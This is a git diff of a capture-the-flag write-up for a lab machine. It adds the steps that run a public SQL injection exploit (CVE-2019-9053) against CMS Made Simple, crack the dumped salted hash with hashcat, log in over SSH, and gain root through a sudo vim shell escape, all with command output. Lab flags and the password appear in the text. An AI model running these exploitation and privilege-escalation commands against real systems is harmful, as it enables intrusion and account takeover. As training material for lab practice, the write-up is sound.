@@ -1,7 +1,7 @@
 # Simple CTF
 
 ```sh
-export IP=10.10.201.25
+export IP=10.10.70.219
 ```
 
 ## nmap
@@ -12,7 +12,7 @@ map -p- -Pn -A -T5 $IP
 
 ```
 Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-04 16:12 WEST
-Nmap scan report for 10.10.201.25
+Nmap scan report for 10.10.70.219
 Host is up (0.075s latency).
 
 PORT     STATE SERVICE VERSION
@@ -58,11 +58,11 @@ Version: vsftpd 3.0.3
 Anonymous login: 
 
 ```sh
-ftp anonymous@10.10.201.25
+ftp anonymous@$IP
 ```
 
 ```
-Connected to 10.10.201.25.
+Connected to 10.10.70.219.
 220 (vsFTPd 3.0.3)
 230 Login successful.
 Remote system type is UNIX.
@@ -75,7 +75,9 @@ ftp> cd /var/www/html
 ```
 
 ConnectorException: Error getting FTP files: Error from FTP Server, 550 Failed to change directory.
+
 This error means the specified remote directory does not exist.
+
 However it is important to understand how this value should be configured.
 
 ```
@@ -145,8 +147,71 @@ Apache 2.4.18 (Ubuntu)
 
 ## ssh 2222
 
-[Search OpenSSH 7.2p2 CVEs](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=OpenSSH+7.2p2)
+[Search OpenSSH 7.2p2 CVEs](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=OpenSSH+7.2p2) (2 entries)
+
+<details>
+  <summary>Spoiler: password</summary>
+
+  `secret`
+
+</details>
+
+### Exploit
+
+Found /simple with gobuster. This site is powered by CMS Made Simple version 2.2.8
+
+[Search CMS Made Simple CVEs](https://www.exploit-db.com/search?q=CMS+made+simple) (34 entries)
+- SQL injection vulnerability [CVE-2019-9053](https://www.exploit-db.com/exploits/46635)
+
+Downloaded [46635.py](46635.py) from exploit-db.com
 
 ```sh
+sudo apt install python2 python-pip
+python2 -m pip install requests termcolor
+python2 46635.py -u http://$IP/simple
+```
 
+```
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: 9
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+```
+
+Time to crack the salted hash with [hashcat](https://hashcat.net/hashcat/)
+
+```sh
+hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 ~/wordlists/rockyou.txt
+```
+
+```
+0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
+```
+
+```sh
+ssh -p 2222 mitch@$IP
+$ cat user.txt	
+G00d j0b, keep up!
+$ /bin/bash
+mitch@Machine:/$ cd /home
+mitch@Machine:/home$ ll
+total 16
+drwxr-xr-x  4 root    root    4096 aug 17  2019 ./
+drwxr-xr-x 23 root    root    4096 aug 19  2019 ../
+drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch/
+drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath/
+```
+
+```bash
+mitch@Machine:/home$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+```
+
+[GTFOBins Vim](https://gtfobins.github.io/gtfobins/vim/)
+
+```sh
+tch@Machine:/home$ sudo vim -c ':!/bin/bash'
+root@Machine:~# cat /root/root.txt
+W3ll d0n3. You made it!
 ```
